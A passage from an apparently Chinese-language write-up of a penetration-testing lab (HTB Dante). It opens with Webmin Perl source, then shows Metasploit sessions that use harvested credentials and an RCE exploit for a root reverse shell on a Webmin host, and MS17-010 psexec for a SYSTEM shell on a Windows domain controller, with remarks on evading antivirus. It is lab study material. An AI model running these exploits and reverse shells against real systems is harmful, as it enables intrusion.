	<span class="nv">@args</span> <span class="o">=</span> <span class="p">(</span> <span class="nv">$text</span><span class="p">{'</span><span class="s1">main_title2</span><span class="p">'},</span> <span class="nb">undef</span> <span class="p">);</span>
	<span class="p">}</span>
<span class="k">else</span> <span class="p">{</span>
	<span class="nv">@args</span> <span class="o">=</span> <span class="p">(</span> <span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">nohostname</span><span class="p">'}</span> <span class="p">?</span> <span class="nv">$text</span><span class="p">{'</span><span class="s1">main_title2</span><span class="p">'}</span> <span class="p">:</span>
		    <span class="nv">&amp;text</span><span class="p">('</span><span class="s1">main_title</span><span class="p">',</span> <span class="nv">$ver</span><span class="p">,</span> <span class="nv">$hostname</span><span class="p">,</span> <span class="nv">$ostr</span><span class="p">),</span>
		  <span class="p">"</span><span class="s2">images/webmin-blue.png</span><span class="p">"</span> <span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">showlogin</span><span class="p">'})</span> <span class="p">{</span>
		<span class="nv">$args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$remote_user</span><span class="o">.</span><span class="p">"</span><span class="s2"> : </span><span class="p">"</span><span class="o">.</span><span class="nv">$args</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
		<span class="p">}</span>
	<span class="p">}</span>
<span class="nv">&amp;header</span><span class="p">(</span><span class="nv">@args</span><span class="p">,</span> <span class="nb">undef</span><span class="p">,</span> <span class="nb">undef</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span>
	<span class="nv">$tconfig</span><span class="p">{'</span><span class="s1">brand</span><span class="p">'}</span> <span class="p">?</span> 
	<span class="p">"</span><span class="s2">&lt;a href=</span><span class="si">$tconfig</span><span class="s2">{'brand_url'}&gt;</span><span class="si">$tconfig</span><span class="s2">{'brand'}&lt;/a&gt;</span><span class="p">"</span> <span class="p">:</span>
	<span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">brand</span><span class="p">'}</span> <span class="p">?</span> 
	<span class="p">"</span><span class="s2">&lt;a href=</span><span class="si">$gconfig</span><span class="s2">{'brand_url'}&gt;</span><span class="si">$gconfig</span><span class="s2">{'brand'}&lt;/a&gt;</span><span class="p">"</span> <span class="p">:</span>
	<span class="p">"</span><span class="s2">&lt;a href=http://www.webmin.com/&gt;</span><span class="si">$text</span><span class="s2">{'main_homepage'}&lt;/a&gt;</span><span class="p">"</span>
	<span class="p">);</span>
<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;center&gt;&lt;font size=+1&gt;</span><span class="p">",</span>
    <span class="nv">&amp;text</span><span class="p">('</span><span class="s1">main_version</span><span class="p">',</span> <span class="nv">$ver</span><span class="p">,</span> <span class="nv">$hostname</span><span class="p">,</span> <span class="nv">$ostr</span><span class="p">),"</span><span class="s2">&lt;/font&gt;&lt;/center&gt;</span><span class="se">\n</span><span class="p">"</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">nohostname</span><span class="p">'});</span>
<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;hr id='header_hr'&gt;&lt;p&gt;</span><span class="se">\n</span><span class="p">";</span>

<span class="k">print</span> <span class="nv">$text</span><span class="p">{'</span><span class="s1">main_header</span><span class="p">'};</span>

<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">@modules</span><span class="p">)</span> <span class="p">{</span>
	<span class="c1"># use has no modules!</span>
	<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;p class='main_none'&gt;&lt;b&gt;</span><span class="si">$text</span><span class="s2">{'main_none'}&lt;/b&gt;&lt;p&gt;</span><span class="se">\n</span><span class="p">";</span>
	<span class="p">}</span>
<span class="k">elsif</span> <span class="p">(</span><span class="nv">$gconfig</span><span class="p">{"</span><span class="s2">notabs_</span><span class="si">${base_remote_user}</span><span class="p">"}</span> <span class="o">==</span> <span class="mi">2</span> <span class="o">||</span>
    <span class="nv">$gconfig</span><span class="p">{"</span><span class="s2">notabs_</span><span class="si">${base_remote_user}</span><span class="p">"}</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">notabs</span><span class="p">'})</span> <span class="p">{</span>
	<span class="c1"># Generate main menu with all modules on one page</span>
	<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;center&gt;&lt;table id='mods' cellpadding=5 cellspacing=0 width=100%&gt;</span><span class="se">\n</span><span class="p">";</span>
	<span class="nv">$pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="nv">$cols</span> <span class="o">=</span> <span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">nocols</span><span class="p">'}</span> <span class="p">?</span> <span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">nocols</span><span class="p">'}</span> <span class="p">:</span> <span class="mi">4</span><span class="p">;</span>
	<span class="nv">$per</span> <span class="o">=</span> <span class="mf">100.0</span> <span class="o">/</span> <span class="nv">$cols</span><span class="p">;</span>
	<span class="k">foreach</span> <span class="nv">$m</span> <span class="p">(</span><span class="nv">@modules</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="nv">$pos</span> <span class="o">%</span> <span class="nv">$cols</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="k">print</span> <span class="p">"</span><span class="s2">&lt;tr </span><span class="si">$cb</span><span class="s2">&gt;</span><span class="se">\n</span><span class="p">";</span> <span class="p">}</span>
		<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;td valign=top align=center width=</span><span class="si">$per</span><span class="se">\</span><span class="s2">%&gt;</span><span class="se">\n</span><span class="p">";</span>
		<span class="nb">local</span> <span class="nv">$idx</span> <span class="o">=</span> <span class="nv">$m</span><span class="o">-&gt;</span><span class="p">{'</span><span class="s1">index_link</span><span class="p">'};</span>
		<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;table border&gt;&lt;tr&gt;&lt;td&gt;&lt;a href=</span><span class="si">$gconfig</span><span class="s2">{'webprefix'}/</span><span class="si">$m</span><span class="s2">-&gt;{'dir'}/</span><span class="si">$idx</span><span class="s2">&gt;</span><span class="p">",</span>
		      <span class="p">"</span><span class="s2">&lt;img src=</span><span class="si">$m</span><span class="s2">-&gt;{'dir'}/images/icon.gif border=0 </span><span class="p">",</span>
		      <span class="p">"</span><span class="s2">width=48 height=48&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span><span class="se">\n</span><span class="p">";</span>
		<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;a href=</span><span class="si">$gconfig</span><span class="s2">{'webprefix'}/</span><span class="si">$m</span><span class="s2">-&gt;{'dir'}/</span><span class="si">$idx</span><span class="s2">&gt;</span><span class="si">$m</span><span class="s2">-&gt;{'desc'}&lt;/a&gt;&lt;/td&gt;</span><span class="se">\n</span><span class="p">";</span>
		<span class="k">if</span> <span class="p">(</span><span class="nv">$pos</span> <span class="o">%</span> <span class="nv">$cols</span> <span class="o">==</span> <span class="nv">$cols</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="k">print</span> <span class="p">"</span><span class="s2">&lt;/tr&gt;</span><span class="se">\n</span><span class="p">";</span> <span class="p">}</span>
		<span class="nv">$pos</span><span class="o">++</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;/table&gt;&lt;/center&gt;&lt;p&gt;&lt;hr id='mods_hr'&gt;</span><span class="se">\n</span><span class="p">";</span>
	<span class="p">}</span>
<span class="k">else</span> <span class="p">{</span>
	<span class="c1"># Display under categorised tabs</span>
	<span class="nv">&amp;ReadParse</span><span class="p">();</span>
	<span class="nv">%cats</span> <span class="o">=</span> <span class="nv">&amp;list_categories</span><span class="p">(</span><span class="o">\</span><span class="nv">@modules</span><span class="p">);</span>
	<span class="nv">@cats</span> <span class="o">=</span> <span class="nb">sort</span> <span class="p">{</span> <span class="nv">$b</span> <span class="ow">cmp</span> <span class="nv">$a</span> <span class="p">}</span> <span class="nb">keys</span> <span class="nv">%cats</span><span class="p">;</span>
	<span class="nv">$cats</span> <span class="o">=</span> <span class="nv">@cats</span><span class="p">;</span>
	<span class="nv">$per</span> <span class="o">=</span> <span class="nv">$cats</span> <span class="p">?</span> <span class="mf">100.0</span> <span class="o">/</span> <span class="nv">$cats</span> <span class="p">:</span> <span class="mi">100</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">defined</span><span class="p">(</span><span class="nv">$in</span><span class="p">{'</span><span class="s1">cat</span><span class="p">'}))</span> <span class="p">{</span>
		<span class="c1"># Use default category</span>
		<span class="k">if</span> <span class="p">(</span><span class="nb">defined</span><span class="p">(</span><span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">deftab</span><span class="p">'})</span> <span class="o">&amp;&amp;</span>
		    <span class="nv">&amp;indexof</span><span class="p">(</span><span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">deftab</span><span class="p">'},</span> <span class="nv">@cats</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
			<span class="nv">$in</span><span class="p">{'</span><span class="s1">cat</span><span class="p">'}</span> <span class="o">=</span> <span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">deftab</span><span class="p">'};</span>
			<span class="p">}</span>
		<span class="k">else</span> <span class="p">{</span>
			<span class="nv">$in</span><span class="p">{'</span><span class="s1">cat</span><span class="p">'}</span> <span class="o">=</span> <span class="nv">$cats</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
			<span class="p">}</span>
		<span class="p">}</span>
	<span class="k">elsif</span> <span class="p">(</span><span class="o">!</span><span class="nv">$cats</span><span class="p">{</span><span class="nv">$in</span><span class="p">{'</span><span class="s1">cat</span><span class="p">'}})</span> <span class="p">{</span>
		<span class="nv">$in</span><span class="p">{'</span><span class="s1">cat</span><span class="p">'}</span> <span class="o">=</span> <span class="p">"";</span>
		<span class="p">}</span>
	<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;table id='cattabs' border=0 cellpadding=0 cellspacing=0 height=20&gt;&lt;tr&gt;</span><span class="se">\n</span><span class="p">";</span>
	<span class="nv">$usercol</span> <span class="o">=</span> <span class="nb">defined</span><span class="p">(</span><span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">cs_header</span><span class="p">'})</span> <span class="o">||</span>
		   <span class="nb">defined</span><span class="p">(</span><span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">cs_table</span><span class="p">'})</span> <span class="o">||</span>
		   <span class="nb">defined</span><span class="p">(</span><span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">cs_page</span><span class="p">'});</span>
	<span class="k">foreach</span> <span class="nv">$c</span> <span class="p">(</span><span class="nv">@cats</span><span class="p">)</span> <span class="p">{</span>
		<span class="nv">$t</span> <span class="o">=</span> <span class="nv">$cats</span><span class="p">{</span><span class="nv">$c</span><span class="p">};</span>
		<span class="k">if</span> <span class="p">(</span><span class="nv">$in</span><span class="p">{'</span><span class="s1">cat</span><span class="p">'}</span> <span class="ow">eq</span> <span class="nv">$c</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;td class='usercoll' valign=top </span><span class="si">$cb</span><span class="s2">&gt;</span><span class="p">",</span> <span class="nv">$usercol</span> <span class="p">?</span> <span class="p">"</span><span class="s2">&lt;br&gt;</span><span class="p">"</span> <span class="p">:</span>
			  <span class="p">"</span><span class="s2">&lt;img src=images/lc2.gif alt=</span><span class="se">\"\"</span><span class="s2">&gt;</span><span class="p">","</span><span class="s2">&lt;/td&gt;</span><span class="se">\n</span><span class="p">";</span>
			<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;td class='usercolc' id='selectedcat' </span><span class="si">$cb</span><span class="s2">&gt;&amp;nbsp;&lt;b&gt;</span><span class="si">$t</span><span class="s2">&lt;/b&gt;&amp;nbsp;&lt;/td&gt;</span><span class="se">\n</span><span class="p">";</span>
			<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;td class='usercolr' valign=top </span><span class="si">$cb</span><span class="s2">&gt;</span><span class="p">",</span> <span class="nv">$usercol</span> <span class="p">?</span> <span class="p">"</span><span class="s2">&lt;br&gt;</span><span class="p">"</span> <span class="p">:</span>
			  <span class="p">"</span><span class="s2">&lt;img src=images/rc2.gif alt=</span><span class="se">\"\"</span><span class="s2">&gt;</span><span class="p">","</span><span class="s2">&lt;/td&gt;</span><span class="se">\n</span><span class="p">";</span>
			<span class="p">}</span>
		<span class="k">else</span> <span class="p">{</span>
			<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;td class='usercoll' valign=top </span><span class="si">$tb</span><span class="s2">&gt;</span><span class="p">",</span> <span class="nv">$usercol</span> <span class="p">?</span> <span class="p">"</span><span class="s2">&lt;br&gt;</span><span class="p">"</span> <span class="p">:</span>
			  <span class="p">"</span><span class="s2">&lt;img src=images/lc1.gif alt=</span><span class="se">\"\"</span><span class="s2">&gt;</span><span class="p">","</span><span class="s2">&lt;/td&gt;</span><span class="se">\n</span><span class="p">";</span>
			<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;td class='usercolc' </span><span class="si">$tb</span><span class="s2">&gt;&amp;nbsp;</span><span class="p">",</span>
			      <span class="p">"</span><span class="s2">&lt;a href=</span><span class="si">$gconfig</span><span class="s2">{'webprefix'}/?cat=</span><span class="si">$c</span><span class="s2">&gt;&lt;b&gt;</span><span class="si">$t</span><span class="s2">&lt;/b&gt;&lt;/a&gt;&amp;nbsp;&lt;/td&gt;</span><span class="se">\n</span><span class="p">";</span>
			<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;td class='usercolr' valign=top </span><span class="si">$tb</span><span class="s2">&gt;</span><span class="p">",</span> <span class="nv">$usercol</span> <span class="p">?</span> <span class="p">"</span><span class="s2">&lt;br&gt;</span><span class="p">"</span> <span class="p">:</span>
			  <span class="p">"</span><span class="s2">&lt;img src=images/rc1.gif alt=</span><span class="se">\"\"</span><span class="s2">&gt;</span><span class="p">","</span><span class="s2">&lt;/td&gt;</span><span class="se">\n</span><span class="p">";</span>
			<span class="p">}</span>
		<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;td width=10&gt;&lt;/td&gt;</span><span class="se">\n</span><span class="p">";</span>
		<span class="p">}</span>
	<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;/tr&gt;&lt;/table&gt; &lt;table id='mods' border=0 cellpadding=0 cellspacing=0 </span><span class="p">",</span>
              <span class="p">"</span><span class="s2">width=100% </span><span class="si">$cb</span><span class="s2">&gt;</span><span class="se">\n</span><span class="p">";</span>
	<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;tr&gt;&lt;td&gt;&lt;table width=100% cellpadding=5&gt;</span><span class="se">\n</span><span class="p">";</span>

	<span class="c1"># Display the modules in this category</span>
	<span class="nv">$pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="nv">$cols</span> <span class="o">=</span> <span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">nocols</span><span class="p">'}</span> <span class="p">?</span> <span class="nv">$gconfig</span><span class="p">{'</span><span class="s1">nocols</span><span class="p">'}</span> <span class="p">:</span> <span class="mi">4</span><span class="p">;</span>
	<span class="nv">$per</span> <span class="o">=</span> <span class="mf">100.0</span> <span class="o">/</span> <span class="nv">$cols</span><span class="p">;</span>
	<span class="k">foreach</span> <span class="nv">$m</span> <span class="p">(</span><span class="nv">@modules</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">next</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$m</span><span class="o">-&gt;</span><span class="p">{'</span><span class="s1">category</span><span class="p">'}</span> <span class="ow">ne</span> <span class="nv">$in</span><span class="p">{'</span><span class="s1">cat</span><span class="p">'});</span>

		<span class="k">if</span> <span class="p">(</span><span class="nv">$pos</span> <span class="o">%</span> <span class="nv">$cols</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="k">print</span> <span class="p">"</span><span class="s2">&lt;tr&gt;</span><span class="se">\n</span><span class="p">";</span> <span class="p">}</span>
		<span class="nb">local</span> <span class="nv">$idx</span> <span class="o">=</span> <span class="nv">$m</span><span class="o">-&gt;</span><span class="p">{'</span><span class="s1">index_link</span><span class="p">'};</span>
		<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;td valign=top align=center width=</span><span class="si">$per</span><span class="se">\</span><span class="s2">%&gt;</span><span class="se">\n</span><span class="p">";</span>
		<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;table border bgcolor=#ffffff&gt;&lt;tr&gt;&lt;td&gt;&lt;a href=</span><span class="si">$gconfig</span><span class="s2">{'webprefix'}/</span><span class="si">$m</span><span class="s2">-&gt;{'dir'}/</span><span class="si">$idx</span><span class="s2">&gt;</span><span class="p">",</span>
		      <span class="p">"</span><span class="s2">&lt;img src=</span><span class="si">$m</span><span class="s2">-&gt;{'dir'}/images/icon.gif alt=</span><span class="se">\"\"</span><span class="s2"> border=0&gt;&lt;/a&gt;</span><span class="p">",</span>
		      <span class="p">"</span><span class="s2">&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span><span class="se">\n</span><span class="p">";</span>
		<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;a href=</span><span class="si">$gconfig</span><span class="s2">{'webprefix'}/</span><span class="si">$m</span><span class="s2">-&gt;{'dir'}/</span><span class="si">$idx</span><span class="s2">&gt;</span><span class="si">$m</span><span class="s2">-&gt;{'desc'}&lt;/a&gt;&lt;/td&gt;</span><span class="se">\n</span><span class="p">";</span>
		<span class="k">if</span> <span class="p">(</span><span class="nv">$pos</span><span class="o">++</span> <span class="o">%</span> <span class="nv">$cols</span> <span class="o">==</span> <span class="nv">$cols</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="k">print</span> <span class="p">"</span><span class="s2">&lt;/tr&gt;</span><span class="se">\n</span><span class="p">";</span> <span class="p">}</span>
		<span class="p">}</span>
	<span class="k">while</span><span class="p">(</span><span class="nv">$pos</span><span class="o">++</span> <span class="o">%</span> <span class="nv">$cols</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;td width=</span><span class="si">$per</span><span class="se">\</span><span class="s2">%&gt;&lt;/td&gt;</span><span class="se">\n</span><span class="p">";</span>
		<span class="p">}</span>
	<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;/table&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;p&gt;&lt;hr id='mods_hr'&gt;</span><span class="se">\n</span><span class="p">";</span>
	<span class="p">}</span>

<span class="c1"># Check for incorrect OS</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">&amp;foreign_check</span><span class="p">("</span><span class="s2">webmin</span><span class="p">"))</span> <span class="p">{</span>
	<span class="nv">&amp;foreign_require</span><span class="p">("</span><span class="s2">webmin</span><span class="p">",</span> <span class="p">"</span><span class="s2">webmin-lib.pl</span><span class="p">");</span>
	<span class="nv">&amp;</span><span class="nn">webmin::</span><span class="nv">show_webmin_notifications</span><span class="p">();</span>
	<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$miniserv</span><span class="p">{'</span><span class="s1">logout</span><span class="p">'}</span> <span class="o">&amp;&amp;</span>
    <span class="o">!</span><span class="nv">$ENV</span><span class="p">{'</span><span class="s1">SSL_USER</span><span class="p">'}</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$ENV</span><span class="p">{'</span><span class="s1">LOCAL_USER</span><span class="p">'}</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$ENV</span><span class="p">{'</span><span class="s1">ANONYMOUS_USER</span><span class="p">'}</span> <span class="o">&amp;&amp;</span>
    <span class="nv">$ENV</span><span class="p">{'</span><span class="s1">HTTP_USER_AGENT</span><span class="p">'}</span> <span class="o">!~</span> <span class="sr">/webmin/i</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;table id='altlogout' width=100% cellpadding=0 cellspacing=0&gt;&lt;tr&gt;</span><span class="se">\n</span><span class="p">";</span>
	<span class="k">if</span> <span class="p">(</span><span class="nv">$</span><span class="nn">main::</span><span class="nv">session_id</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;td align=right&gt;&lt;a href='session_login.cgi?logout=1'&gt;</span><span class="p">",</span>
		      <span class="p">"</span><span class="si">$text</span><span class="s2">{'main_logout'}&lt;/a&gt;&lt;/td&gt;</span><span class="se">\n</span><span class="p">";</span>
		<span class="p">}</span>
	<span class="k">else</span> <span class="p">{</span>
		<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;td align=right&gt;&lt;a href=switch_user.cgi&gt;</span><span class="p">",</span>
		      <span class="p">"</span><span class="si">$text</span><span class="s2">{'main_switch'}&lt;/a&gt;&lt;/td&gt;</span><span class="se">\n</span><span class="p">";</span>
		<span class="p">}</span>
	<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;/tr&gt;&lt;/table&gt;</span><span class="se">\n</span><span class="p">";</span>
	<span class="p">}</span>

<span class="k">print</span> <span class="nv">$text</span><span class="p">{'</span><span class="s1">main_footer</span><span class="p">'};</span>
<span class="nv">&amp;footer</span><span class="p">();</span>

</code></pre></div></div>
<h2 id="webmin-服务-rce">webmin 服务 RCE</h2>
<p>10000 端口部署了一个 webmin 服务，结合此前从 monitor 中获取的用户名密码：</p>
<ul>
  <li>admin/password6543</li>
  <li>admin/Password6543</li>
</ul>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231226023313.png" alt="20231226023313" /></p>

<!-- ![Alt text](../../../../../assets/image-8.png) -->

<p>使用第二个密码可以成功登陆，并且 1.900 存在较多漏洞。</p>

<p>msf 中集成了一些 exp。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Matching Modules
<span class="o">================</span>

   <span class="c">#  Name                                           Disclosure Date  Rank       Check  Description</span>
   -  <span class="nt">----</span>                                           <span class="nt">---------------</span>  <span class="nt">----</span>       <span class="nt">-----</span>  <span class="nt">-----------</span>
   0  exploit/unix/webapp/webmin_show_cgi_exec       2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   1  auxiliary/admin/webmin/file_disclosure         2006-06-30       normal     No     Webmin File Disclosure
   2  exploit/linux/http/webmin_file_manager_rce     2022-02-26       excellent  Yes    Webmin File Manager RCE
   3  exploit/linux/http/webmin_package_updates_rce  2022-07-26       excellent  Yes    Webmin Package Updates RCE
   4  exploit/linux/http/webmin_packageup_rce        2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   5  exploit/unix/webapp/webmin_upload_exec         2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
   6  auxiliary/admin/webmin/edit_html_fileaccess    2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   7  exploit/linux/http/webmin_backdoor             2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor

</code></pre></div></div>

<p>但我在利用如下的几个 exp 时都无法成功</p>
<ul>
  <li>exploit/linux/http/webmin_packageup_rce (webmin&lt;=1.900)</li>
  <li>exploit/linux/http/webmin_file_manager_rce (webmin v1.984)</li>
</ul>

<p>最后成功是利用了这个 exp：</p>
<ul>
  <li>exploit/linux/http/webmin_packageup_rce (&lt;=1.910)</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOSTS 172.16.1.17
RHOSTS <span class="o">=&gt;</span> 172.16.1.17
msf6 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>username admin
username <span class="o">=&gt;</span> admin
msf6 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>password Password6543
password <span class="o">=&gt;</span> Password6543
msf6 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LPORT 5555
LPORT <span class="o">=&gt;</span> 5555
msf6 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST 10.10.14.5
LHOST <span class="o">=&gt;</span> 10.10.14.5
msf6 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> run

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.5:5555 
<span class="o">[</span>+] Session cookie: e1dece8037d8d0ad4eb308ceb0166993
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Attempting to execute the payload...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 12 opened <span class="o">(</span>10.10.14.5:5555 -&gt; 10.10.110.3:40521<span class="o">)</span> at 2023-12-26 03:17:45 <span class="nt">-0500</span>


<span class="nb">whoami
</span>root


</code></pre></div></div>
<p>一开始获取到的是 sh，无法切目录也无法读取 /root/flag.txt，可能是对 sh 进行了限制，进入 bash 后可以正常读取文件。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nv">$0</span>
bash
<span class="nb">cat</span> /root/flag
</code></pre></div></div>

<p>用户目录下有一个用户 lou，但 Desktop 中没有 flag。</p>

<h1 id="windows-17216120-dante-dc01">Windows: 172.16.1.20 (DANTE-DC01)</h1>

<h2 id="ms17-010">MS17-010</h2>
<p>msf 中关于 MS17-010 的 exp 总共有四个：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0  exploit/windows/smb/ms17_010_eternalblue              2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
1  exploit/windows/smb/ms17_010_psexec                   2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
2  auxiliary/admin/smb/ms17_010_command                  2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
3  auxiliary/scanner/smb/smb_ms17_010                                     normal   No     MS17-010 SMB RCE Detection
</code></pre></div></div>

<ol>
  <li>exploit/windows/smb/ms17_010_eternalblue 存在ms17-010漏洞即可使用，不太稳定，容易被杀软识别，有概率导致目标机蓝屏</li>
  <li>exploit/windows/smb/ms17_010_psexec 需要命名管道开启，配合模块3，比 ms17_010_eternalblue 稳定，可绕过一些杀软。</li>
  <li>auxiliary/admin/smb/ms17_010_command 该模块是所有利用方法中最为稳定的，并且不会被杀软拦截等。可以直接通过命令添加用户、开启3389、下载Rat等操作。</li>
  <li>auxiliary/scanner/smb/smb_ms17_010 用来探测ms17-010漏洞是否存在</li>
</ol>

<p>我们可以先利用 auxiliary/scanner/smb/smb_ms17_010 探测漏洞是否存在。注意在利用前先添加路由，multi/manage/autoroute 模块可以自动添加路由。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use multi/manage/autoroute
<span class="nb">set </span>session 1
exploit
</code></pre></div></div>
<p>探测漏洞</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use auxiliary/scanner/smb/smb_ms17_010
<span class="nb">set </span>RHOSTS 172.16.1.20
exploit 

<span class="o">[</span>+] 172.16.1.20:445       - Host is likely VULNERABLE to MS17-010! - Windows Server 2012 R2 Standard 9600 x64 <span class="o">(</span>64-bit<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.20:445       - Scanned 1 of 1 hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Auxiliary module execution completed
</code></pre></div></div>
<p>使用 use exploit/windows/smb/ms17_010_psexec 模块进行利用。payload 也可以使用 set payload windows/meterpreter/reverse_tcp，可以获取一个 meterpreter。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/windows/smb/ms17_010_psexec
<span class="nb">set </span>rhost 172.16.1.20
<span class="nb">set </span>lhost 10.10.14.5
<span class="c"># set payload windows/meterpreter/reverse_tcp</span>
<span class="nb">set </span>payload generic/shell_reverse_tcp
run

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.5:4444 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.20:445 - Target OS: Windows Server 2012 R2 Standard 9600
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.20:445 - Built a write-what-where primitive...
<span class="o">[</span>+] 172.16.1.20:445 - Overwrite complete... SYSTEM session obtained!
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.20:445 - Selecting PowerShell target
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.20:445 - Executing the payload...
<span class="o">[</span>+] 172.16.1.20:445 - Service start timed out, OK <span class="k">if </span>running a <span class="nb">command </span>or non-service executable...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 2 opened <span class="o">(</span>10.10.14.5:4444 -&gt; 10.10.110.3:41827<span class="o">)</span> at 2023-12-25 03:15:33 <span class="nt">-0500</span>


Shell Banner:
